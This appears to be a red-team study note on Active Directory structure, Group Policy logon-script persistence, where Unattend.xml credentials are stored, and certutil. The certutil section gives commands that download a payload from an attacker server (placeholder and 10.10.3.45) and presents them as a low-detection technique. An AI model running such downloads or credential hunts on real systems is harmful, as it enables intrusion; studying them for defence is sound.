# Active Directory: Lay of the Land

A foundation understanding of Active Directory architecture, key components, and attack surface areas.

---

## Active Directory Fundamentals

### Domain
A logical grouping of users, computers, and resources within an organization. The domain name serves as the identifier for this collection and establishes the namespace for authentication and resource access.

### Domain Controllers
Servers that store and manage the central Active Directory database. Domain controllers contain all user accounts, group memberships, security policies, and resource configurations for the domain.

**Attack Relevance:** Compromising a domain controller grants access to the complete AD database—the highest-value target in an AD environment.

### Active Directory Users and Computers (ADUC)
The administrative interface for managing users, computers, groups, and organizational structure within the domain. Essential for both administrators and red teamers to understand policy application and permission delegation.

### Organizational Units (OUs)
The smallest container object within Active Directory that organizes users, computers, groups, and other OUs into a hierarchical structure.

**Key characteristics:**
- Enables hierarchical organization of the domain
- Serves as the scope for Group Policy application
- Supports nested OUs for granular policy management
- Best practice: Use inheritance to assign policies across multiple levels

**Attack Relevance:** Misconfigurations in OU permissions and policy inheritance are common privilege escalation vectors. Overpermissive access to OUs can allow unprivileged users to modify group memberships or apply malicious policies.

---

## Group Policy & Persistence

### Group Policy Objects (GPO)

**Definition:** Administrative templates that enforce security settings, configure services, and execute scripts across Active Directory.

**Policy Types:**
- Local Group Policy (single machine)
- Domain Group Policy (applied across OUs)

**Configuration:**
- Managed through Group Policy Editor (`gpedit.msc`)
- Policy changes take effect on next user logon
- Manual refresh: `gpupdate /force`

### Logon Scripts & Persistence

GPOs can enforce logon scripts that execute automatically during user authentication. This mechanism is often leveraged for:
- Administrative automation
- Legitimate service initialization
- **Adversarial persistence** (MITRE ATT&CK T1037)

#### MITRE ATT&CK T1037: Boot or Logon Initialization Scripts

**Technique:** Adversaries use boot or logon scripts to establish persistence, execute arbitrary code, or escalate privileges.

**Execution Context:** Many initialization scripts run with elevated privileges (SYSTEM or administrative accounts), presenting escalation opportunities.

**Key Mitigations:**
- Restrict write access to logon script files to authorized administrators only
- Enforce strict permissions on Registry hives containing script references
- Monitor Group Policy modifications for unauthorized changes

---

## Credentials & Configuration

### Answer Files (Unattend.xml)

Windows Setup uses answer files to automate OS configuration. These files can contain sensitive information including:
- Local account credentials
- Domain administrator credentials
- Product keys and licensing information

**Credential Storage:** Credentials within answer files are often Base64-encoded (not encrypted).

**File Locations to Check:**

| Location | Importance | Notes |
|:---|:---|:---|
| `HKEY_LOCAL_MACHINE\System\Setup\UnattendFile` | High | Registry pointer to answer file location |
| `%WINDIR%\Panther\Unattend` | High | Standard unattend file directory on downlevel installations |
| `%WINDIR%\Panther` | Medium | Answer files cached here during installation (restrictive permissions) |

**Security Note:** The `\Panther` directory is typically restricted to elevated privileges, but cached answer files may persist from system setup and warrant investigation during post-exploitation.

**Attack Relevance:** Forgotten or improperly cleaned answer files are a reliable source of high-privilege credentials during domain assessment.

---

## Native Windows Tools & Capabilities

### certutil (Certificate Utility)

Built-in Windows utility for certificate operations, including downloading files from remote servers without requiring external tools.

**Usage:**
```cmd
certutil -urlcache -f http://<attacker-server>/<path> <local-filename>
```

**Example:**
```cmd
certutil -urlcache -f http://10.10.3.45/payload.exe payload.exe
```

**Advantages:**
- Present on all modern Windows systems
- Minimal suspicious indicators (legitimate cert operations)
- Useful for fileless or living-off-the-land attacks

**Note:** Develop custom payloads using C or `msfvenom` rather than relying on pre-built tools.

---

## References

- [Professor Messer - Active Directory Fundamentals](https://www.youtube.com/watch?v=GuWMKVTMD7k)
- [Microsoft: Windows Setup Automation & Answer Files](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs?view=windows-11)
- [Microsoft: Windows Setup Answer File Search Order](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview?view=windows-11#implicit-answer-file-search-order)
- [MITRE ATT&CK T1037: Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037/)
